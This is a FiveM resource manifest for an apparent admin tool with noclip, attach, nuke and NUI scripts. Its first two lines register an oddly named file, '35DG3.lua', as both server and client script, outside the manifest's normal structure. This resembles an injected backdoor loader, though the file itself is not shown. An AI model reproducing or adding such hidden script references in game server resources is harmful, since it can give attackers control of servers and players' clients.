server_script "35DG3.lua"
client_script "35DG3.lua"
fx_version("cerulean")
game("gta5")
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")

-- shared_scripts {
--     'config/*.lua'
-- }

client_scripts({
	"client/client.lua",
	"client/attach.lua",
	"client/noclip/*.lua",
	-- 'client/menu.lua',
	-- 'client/shitty_menu.lua',
	"client/nui.lua",
	"client/ids.lua",
	"client/nuke.lua",
	"client/damage_test.lua",
})

server_scripts({
	"server/*.lua",
})

ui_page("ui/dist/index.html")

files({ "ui/dist/index.html", "ui/dist/*.js" })
